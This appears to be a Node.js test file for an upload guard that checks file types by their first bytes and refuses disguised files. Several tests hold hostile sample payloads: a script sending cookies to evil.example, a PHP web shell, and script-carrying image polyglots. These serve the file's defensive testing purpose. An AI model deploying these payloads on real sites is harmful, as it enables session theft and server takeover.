/* Upload guard: a picture must really be a picture (functions/upload-guard.js).
   The same detection runs in the browser (CodeLab.checkUpload in js/tech/code-lab.js). */
const test = require("node:test");
const assert = require("node:assert/strict");
const { sniffBytes, verdict } = require("../upload-guard")._test;

const bytes = (...parts) => Buffer.concat(parts.map((p) => (typeof p === "string" ? Buffer.from(p, "latin1") : Buffer.from(p))));
const PNG = bytes([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A], "....IHDR rest of a picture");
const JPG = bytes([0xFF, 0xD8, 0xFF, 0xE0], "JFIF data");
const GIF = bytes("GIF89a", [1, 0, 1, 0]);
const WEBP = bytes("RIFF", [0, 0, 0, 0], "WEBPVP8 ");
const WAV = bytes("RIFF", [0, 0, 0, 0], "WAVEfmt ");
const MP4 = bytes([0, 0, 0, 0x18], "ftypisom", [0, 0, 0, 0]);
const M4A = bytes([0, 0, 0, 0x18], "ftypM4A ", [0, 0, 0, 0]);
const MP3 = bytes("ID3", [3, 0, 0]);
const WOFF2 = bytes("wOF2", [0, 1, 0, 0]);

test("real files are recognised from their first bytes", () => {
  assert.equal(sniffBytes(PNG), "image/png");
  assert.equal(sniffBytes(JPG), "image/jpeg");
  assert.equal(sniffBytes(GIF), "image/gif");
  assert.equal(sniffBytes(WEBP), "image/webp");
  assert.equal(sniffBytes(WAV), "audio/wav");
  assert.equal(sniffBytes(MP4), "video/mp4");
  assert.equal(sniffBytes(M4A), "audio/mp4");
  assert.equal(sniffBytes(MP3), "audio/mpeg");
  assert.equal(sniffBytes(WOFF2), "font/woff2");
});

test("honest uploads pass", () => {
  assert.equal(verdict("image/png", PNG).ok, true);
  assert.equal(verdict("image/jpeg", JPG).ok, true);
  assert.equal(verdict("video/mp4", MP4).ok, true);
  assert.equal(verdict("audio/mp4", MP4).ok, true, "an .m4a in an mp4 box is honest");
  assert.equal(verdict("audio/mpeg", MP3).ok, true);
  assert.equal(verdict("application/octet-stream", WOFF2).ok, true, "fonts often arrive without a type");
});

test("a script renamed cat.png is refused", () => {
  const v = verdict("image/png", bytes("<script>fetch('https://evil.example/?c='+document.cookie)</script>"));
  assert.equal(v.ok, false);
  assert.match(v.reason, /not a picture/);
  assert.equal(verdict("image/png", bytes("alert(1);//")).ok, false);
  assert.equal(verdict("image/jpeg", bytes("MZ", [0x90, 0])).ok, false, "a Windows program");
  assert.equal(verdict("image/png", bytes("<?php system($_GET['c']); ?>")).ok, false);
});

test("a file that claims one kind but is another is refused", () => {
  const v = verdict("image/png", MP3);
  assert.equal(v.ok, false);
  assert.match(v.reason, /declared image\/png but is audio\/mpeg/);
});

test("pictures with web code hidden inside (polyglots) are refused", () => {
  assert.equal(verdict("image/gif", bytes("GIF89a", "/*", "<script>alert(1)</script>")).ok, false);
  assert.equal(verdict("image/jpeg", bytes([0xFF, 0xD8, 0xFF, 0xFE], "<html><body onload=x>")).ok, false);
});

test("SVG is always refused, it can carry code", () => {
  assert.equal(verdict("image/svg+xml", bytes("<svg xmlns='http://www.w3.org/2000/svg'></svg>")).ok, false);
});
